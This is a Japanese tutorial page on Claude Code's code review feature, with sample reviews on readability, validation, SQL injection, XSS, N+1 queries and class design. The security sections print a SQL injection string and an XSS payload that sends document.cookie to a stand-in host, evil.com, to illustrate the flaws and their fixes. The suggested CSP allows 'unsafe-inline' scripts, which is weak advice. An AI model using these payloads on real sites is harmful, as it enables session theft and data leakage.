# コードレビュー機能

Claude Codeのコードレビュー機能について詳しく説明します。自動的な品質チェックと改善提案の実践例を学習することで、高品質なコードを維持できます。

## コードレビュー機能とは

コードレビュー機能は、作成されたコードを自動的に分析し、品質、セキュリティ、パフォーマンス、保守性の観点から改善提案を行う機能です。人間のレビュアーと同様に、コードの問題点を特定し、具体的な改善方法を提案します。

### 主な特徴

- **多角的な品質チェック**: 構文、ロジック、設計、セキュリティを総合的に評価
- **具体的な改善提案**: 抽象的な指摘ではなく、実装可能な改善案を提示
- **ベストプラクティスの適用**: 業界標準やフレームワーク固有の推奨事項を反映
- **学習効果**: レビューコメントから開発スキルを向上

## レビュー観点

### 1. コード品質

#### 可読性の改善

**レビュー対象コード:**
```typescript
const f = (u: any[], s: string) => {
  const r = [];
  for (let i = 0; i < u.length; i++) {
    if (u[i].n.toLowerCase().indexOf(s.toLowerCase()) !== -1) {
      r.push(u[i]);
    }
  }
  return r;
};
```

**プロンプト:**
```
このコードをレビューして、可読性を改善してください。
```

**Claude Codeのレビュー:**
```
コードレビュー結果:

問題点:
1. 変数名が不明確（f, u, s, r, n）
2. 型定義が不適切（any[]の使用）
3. 古いJavaScript構文の使用
4. 関数の目的が不明確

改善提案:

1. 意味のある変数名と関数名:
```typescript
interface User {
  name: string;
  email: string;
  id: string;
}

const filterUsersByName = (users: User[], searchTerm: string): User[] => {
  return users.filter(user => 
    user.name.toLowerCase().includes(searchTerm.toLowerCase())
  );
};
```

2. さらなる改善（大文字小文字を区別しない検索の最適化）:
```typescript
const filterUsersByName = (users: User[], searchTerm: string): User[] => {
  const normalizedSearchTerm = searchTerm.toLowerCase();
  
  return users.filter(user => 
    user.name.toLowerCase().includes(normalizedSearchTerm)
  );
};
```

3. より柔軟な検索機能:
```typescript
interface SearchableUser extends User {
  name: string;
  email: string;
}

const searchUsers = (
  users: SearchableUser[], 
  searchTerm: string,
  searchFields: (keyof SearchableUser)[] = ['name']
): SearchableUser[] => {
  const normalizedSearchTerm = searchTerm.toLowerCase();
  
  return users.filter(user =>
    searchFields.some(field =>
      user[field].toLowerCase().includes(normalizedSearchTerm)
    )
  );
};
```

改善効果:
- 可読性: 関数の目的が明確
- 保守性: 型安全性の向上
- 拡張性: 検索対象フィールドの柔軟な指定
- パフォーマンス: 検索語の正規化を1回のみ実行
```

#### DRY原則の適用

**レビュー対象コード:**
```typescript
const validateEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};

const validatePhone = (phone: string): boolean => {
  const phoneRegex = /^\d{3}-\d{4}-\d{4}$/;
  return phoneRegex.test(phone);
};

const validateZipCode = (zipCode: string): boolean => {
  const zipRegex = /^\d{3}-\d{4}$/;
  return zipRegex.test(zipCode);
};
```

**Claude Codeのレビュー:**
```
コードレビュー結果:

問題点:
1. 類似した検証ロジックの重複
2. 正規表現パターンの管理が分散
3. 新しい検証ルールの追加時の保守性

改善提案:

1. 汎用的な検証関数の作成:
```typescript
type ValidationPattern = {
  pattern: RegExp;
  errorMessage: string;
};

const validationPatterns: Record<string, ValidationPattern> = {
  email: {
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    errorMessage: '有効なメールアドレスを入力してください'
  },
  phone: {
    pattern: /^\d{3}-\d{4}-\d{4}$/,
    errorMessage: '電話番号は XXX-XXXX-XXXX の形式で入力してください'
  },
  zipCode: {
    pattern: /^\d{3}-\d{4}$/,
    errorMessage: '郵便番号は XXX-XXXX の形式で入力してください'
  }
};

const validateField = (value: string, type: keyof typeof validationPatterns): {
  isValid: boolean;
  errorMessage?: string;
} => {
  const validation = validationPatterns[type];
  const isValid = validation.pattern.test(value);
  
  return {
    isValid,
    errorMessage: isValid ? undefined : validation.errorMessage
  };
};

// 使用例
const emailValidation = validateField('user@example.com', 'email');
const phoneValidation = validateField('090-1234-5678', 'phone');
```

2. より高度な検証システム:
```typescript
interface ValidationRule<T = string> {
  validate: (value: T) => boolean;
  errorMessage: string;
}

class Validator {
  private rules: Map<string, ValidationRule[]> = new Map();
  
  addRule(fieldName: string, rule: ValidationRule): void {
    const existingRules = this.rules.get(fieldName) || [];
    this.rules.set(fieldName, [...existingRules, rule]);
  }
  
  validate(fieldName: string, value: string): {
    isValid: boolean;
    errors: string[];
  } {
    const rules = this.rules.get(fieldName) || [];
    const errors: string[] = [];
    
    for (const rule of rules) {
      if (!rule.validate(value)) {
        errors.push(rule.errorMessage);
      }
    }
    
    return {
      isValid: errors.length === 0,
      errors
    };
  }
}

// セットアップ
const validator = new Validator();

validator.addRule('email', {
  validate: (value) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value),
  errorMessage: '有効なメールアドレスを入力してください'
});

validator.addRule('email', {
  validate: (value) => value.length <= 254,
  errorMessage: 'メールアドレスは254文字以下で入力してください'
});
```

改善効果:
- DRY原則の適用
- 検証ルールの一元管理
- 拡張性の向上
- エラーメッセージの統一
```

### 2. セキュリティ

#### SQLインジェクション対策

**レビュー対象コード:**
```typescript
const getUserById = async (userId: string) => {
  const query = `SELECT * FROM users WHERE id = '${userId}'`;
  return await database.query(query);
};
```

**Claude Codeのレビュー:**
```
セキュリティレビュー結果:

🚨 重大な脆弱性: SQLインジェクション

問題点:
1. ユーザー入力を直接SQLクエリに埋め込み
2. 悪意のある入力による任意のSQL実行が可能
3. データベース全体への不正アクセスリスク

攻撃例:
userId = "1' OR '1'='1' --"
実行されるクエリ: SELECT * FROM users WHERE id = '1' OR '1'='1' --'
結果: 全ユーザーの情報が漏洩

修正方法:

1. パラメータ化クエリの使用:
```typescript
const getUserById = async (userId: string): Promise<User | null> => {
  const query = 'SELECT * FROM users WHERE id = ?';
  const result = await database.query(query, [userId]);
  return result[0] || null;
};
```

2. ORMの使用（推奨）:
```typescript
import { User } from './models/User';

const getUserById = async (userId: string): Promise<User | null> => {
  return await User.findByPk(userId);
};
```

3. 入力値検証の追加:
```typescript
import { z } from 'zod';

const userIdSchema = z.string().uuid();

const getUserById = async (userId: string): Promise<User | null> => {
  // 入力値検証
  const validatedUserId = userIdSchema.parse(userId);
  
  const query = 'SELECT * FROM users WHERE id = ?';
  const result = await database.query(query, [validatedUserId]);
  return result[0] || null;
};
```

追加のセキュリティ対策:
- 最小権限の原則（データベースユーザーの権限制限）
- エラーメッセージでの情報漏洩防止
- ログ記録とモニタリング
```

#### XSS対策

**レビュー対象コード:**
```typescript
const displayUserComment = (comment: string) => {
  const commentElement = document.getElementById('comment');
  commentElement.innerHTML = comment; // XSS脆弱性
};
```

**Claude Codeのレビュー:**
```
セキュリティレビュー結果:

🚨 XSS（Cross-Site Scripting）脆弱性

問題点:
1. ユーザー入力を直接HTMLとして挿入
2. 悪意のあるスクリプトの実行が可能
3. セッション乗っ取りやデータ窃取のリスク

攻撃例:
comment = "<script>alert('XSS Attack!');</script>"
または
comment = "<img src='x' onerror='document.location=\"http://evil.com?cookie=\"+document.cookie'>"

修正方法:

1. テキストコンテンツとして安全に表示:
```typescript
const displayUserComment = (comment: string): void => {
  const commentElement = document.getElementById('comment');
  if (commentElement) {
    commentElement.textContent = comment; // HTMLエスケープされる
  }
};
```

2. HTMLサニタイゼーションライブラリの使用:
```typescript
import DOMPurify from 'dompurify';

const displayUserComment = (comment: string): void => {
  const commentElement = document.getElementById('comment');
  if (commentElement) {
    const sanitizedComment = DOMPurify.sanitize(comment);
    commentElement.innerHTML = sanitizedComment;
  }
};
```

3. Reactでの安全な実装:
```typescript
interface CommentProps {
  comment: string;
}

const CommentDisplay: React.FC<CommentProps> = ({ comment }) => {
  return (
    <div className="comment">
      {/* Reactが自動的にエスケープ */}
      {comment}
    </div>
  );
};

// HTMLを含む場合（注意深く使用）
const CommentDisplayWithHTML: React.FC<CommentProps> = ({ comment }) => {
  const sanitizedComment = DOMPurify.sanitize(comment);
  
  return (
    <div 
      className="comment"
      dangerouslySetInnerHTML={{ __html: sanitizedComment }}
    />
  );
};
```

Content Security Policy (CSP) の設定:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline';">
```
```

### 3. パフォーマンス

#### N+1クエリ問題

**レビュー対象コード:**
```typescript
const getUsersWithPosts = async () => {
  const users = await User.findAll();
  
  const usersWithPosts = [];
  for (const user of users) {
    const posts = await Post.findAll({ where: { userId: user.id } });
    usersWithPosts.push({ ...user, posts });
  }
  
  return usersWithPosts;
};
```

**Claude Codeのレビュー:**
```
パフォーマンスレビュー結果:

⚠️ N+1クエリ問題

問題点:
1. ユーザー数に比例してクエリ数が増加
2. 100ユーザーの場合: 1 + 100 = 101回のクエリ実行
3. データベース負荷とレスポンス時間の増大

修正方法:

1. JOINクエリの使用:
```typescript
const getUsersWithPosts = async (): Promise<UserWithPosts[]> => {
  return await User.findAll({
    include: [{
      model: Post,
      as: 'posts'
    }]
  });
};
```

2. 手動でのバッチ取得:
```typescript
const getUsersWithPosts = async (): Promise<UserWithPosts[]> => {
  const users = await User.findAll();
  const userIds = users.map(user => user.id);
  
  const posts = await Post.findAll({
    where: { userId: { [Op.in]: userIds } }
  });
  
  const postsByUserId = posts.reduce((acc, post) => {
    if (!acc[post.userId]) acc[post.userId] = [];
    acc[post.userId].push(post);
    return acc;
  }, {} as Record<string, Post[]>);
  
  return users.map(user => ({
    ...user.toJSON(),
    posts: postsByUserId[user.id] || []
  }));
};
```

3. DataLoaderパターン（GraphQL環境）:
```typescript
import DataLoader from 'dataloader';

const postLoader = new DataLoader(async (userIds: string[]) => {
  const posts = await Post.findAll({
    where: { userId: { [Op.in]: userIds } }
  });
  
  const postsByUserId = posts.reduce((acc, post) => {
    if (!acc[post.userId]) acc[post.userId] = [];
    acc[post.userId].push(post);
    return acc;
  }, {} as Record<string, Post[]>);
  
  return userIds.map(userId => postsByUserId[userId] || []);
});

const getUsersWithPosts = async (): Promise<UserWithPosts[]> => {
  const users = await User.findAll();
  
  const usersWithPosts = await Promise.all(
    users.map(async user => ({
      ...user.toJSON(),
      posts: await postLoader.load(user.id)
    }))
  );
  
  return usersWithPosts;
};
```

パフォーマンス改善効果:
- クエリ数: 101回 → 2回
- 実行時間: 大幅短縮
- データベース負荷: 軽減
```

### 4. 設計とアーキテクチャ

#### 単一責任原則の違反

**レビュー対象コード:**
```typescript
class UserService {
  async createUser(userData: any) {
    // バリデーション
    if (!userData.email || !userData.name) {
      throw new Error('Invalid data');
    }
    
    // パスワードハッシュ化
    const hashedPassword = await bcrypt.hash(userData.password, 10);
    
    // データベース保存
    const user = await User.create({
      ...userData,
      password: hashedPassword
    });
    
    // メール送信
    await this.sendWelcomeEmail(user.email, user.name);
    
    // ログ記録
    console.log(`User created: ${user.id}`);
    
    // 統計更新
    await this.updateUserStats();
    
    return user;
  }
  
  private async sendWelcomeEmail(email: string, name: string) {
    // メール送信ロジック
  }
  
  private async updateUserStats() {
    // 統計更新ロジック
  }
}
```

**Claude Codeのレビュー:**
```
設計レビュー結果:

⚠️ 単一責任原則（SRP）の違反

問題点:
1. 1つのクラスが複数の責任を持っている
   - データ検証
   - パスワード処理
   - データベース操作
   - メール送信
   - ログ記録
   - 統計更新
2. テストが困難
3. 変更の影響範囲が広い
4. 再利用性が低い

改善提案:

1. 責任の分離:
```typescript
// バリデーション
class UserValidator {
  validate(userData: CreateUserRequest): void {
    if (!userData.email || !userData.name || !userData.password) {
      throw new ValidationError('Email, name, and password are required');
    }
    
    if (!this.isValidEmail(userData.email)) {
      throw new ValidationError('Invalid email format');
    }
  }
  
  private isValidEmail(email: string): boolean {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }
}

// パスワード処理
class PasswordService {
  async hash(password: string): Promise<string> {
    return await bcrypt.hash(password, 10);
  }
  
  async verify(password: string, hash: string): Promise<boolean> {
    return await bcrypt.compare(password, hash);
  }
}

// メール送信
class EmailService {
  async sendWelcomeEmail(email: string, name: string): Promise<void> {
    // メール送信ロジック
  }
}

// ログ記録
class Logger {
  info(message: string, metadata?: any): void {
    console.log(`[INFO] ${message}`, metadata);
  }
  
  error(message: string, error?: Error): void {
    console.error(`[ERROR] ${message}`, error);
  }
}

// 統計管理
class UserStatsService {
  async incrementUserCount(): Promise<void> {
    // 統計更新ロジック
  }
}

// リファクタリング後のUserService
class UserService {
  constructor(
    private userValidator: UserValidator,
    private passwordService: PasswordService,
    private emailService: EmailService,
    private logger: Logger,
    private userStatsService: UserStatsService,
    private userRepository: UserRepository
  ) {}
  
  async createUser(userData: CreateUserRequest): Promise<User> {
    try {
      // バリデーション
      this.userValidator.validate(userData);
      
      // パスワードハッシュ化
      const hashedPassword = await this.passwordService.hash(userData.password);
      
      // ユーザー作成
      const user = await this.userRepository.create({
        ...userData,
        password: hashedPassword
      });
      
      // 非同期処理（メール送信、統計更新）
      this.handlePostCreationTasks(user);
      
      this.logger.info('User created successfully', { userId: user.id });
      
      return user;
    } catch (error) {
      this.logger.error('User creation failed', error);
      throw error;
    }
  }
  
  private async handlePostCreationTasks(user: User): Promise<void> {
    try {
      await Promise.all([
        this.emailService.sendWelcomeEmail(user.email, user.name),
        this.userStatsService.incrementUserCount()
      ]);
    } catch (error) {
      this.logger.error('Post-creation tasks failed', error);
      // エラーは記録するが、ユーザー作成は成功として扱う
    }
  }
}
```

2. 依存性注入の設定:
```typescript
// DIコンテナの設定
const container = new Container();

container.bind<UserValidator>(UserValidator).toSelf();
container.bind<PasswordService>(PasswordService).toSelf();
container.bind<EmailService>(EmailService).toSelf();
container.bind<Logger>(Logger).toSelf();
container.bind<UserStatsService>(UserStatsService).toSelf();
container.bind<UserRepository>(UserRepository).toSelf();
container.bind<UserService>(UserService).toSelf();

// 使用例
const userService = container.get<UserService>(UserService);
```

改善効果:
- 単一責任原則の遵守
- テスタビリティの向上
- 保守性の向上
- 再利用性の向上
- 依存関係の明確化
```

## 自動レビューの活用

### 1. プルリクエストレビュー

**プロンプト:**
```
以下のプルリクエストをレビューしてください：

変更内容: ユーザー認証機能の追加
ファイル:
- src/auth/AuthService.ts
- src/middleware/authMiddleware.ts
- src/routes/authRoutes.ts
- tests/auth.test.ts

[各ファイルの内容を貼り付け]

レビュー観点:
- セキュリティ
- パフォーマンス
- テストカバレッジ
- コード品質
```

### 2. 継続的品質改善

**プロンプト:**
```
このプロジェクトの全体的なコード品質を評価し、
改善すべき優先順位を教えてください。

プロジェクト構造:
[プロジェクト構造を提示]

重点的にチェックしたい項目:
- 技術的負債
- セキュリティリスク
- パフォーマンスボトルネック
- 保守性の問題
```

## 次のステップ

コードレビュー機能を理解したら：

1. **[外部ツール連携](integration-tools.md)** - CI/CDでの自動レビュー
2. **[AIによる設計レビュー](../06-development-process/05-ai-design-review.md)** - 設計レベルでの品質管理
3. **[チーム開発](../07-team-development/README.md)** - チーム全体での品質向上

---

**関連ドキュメント:**
- [デバッグサポート](debugging-support.md) - エラー解決との連携
- [単体テスト](../06-development-process/06-unit-testing.md) - テスト品質の向上
- [設計原則管理](../06-development-process/03-design-principles.md) - 品質基準の設定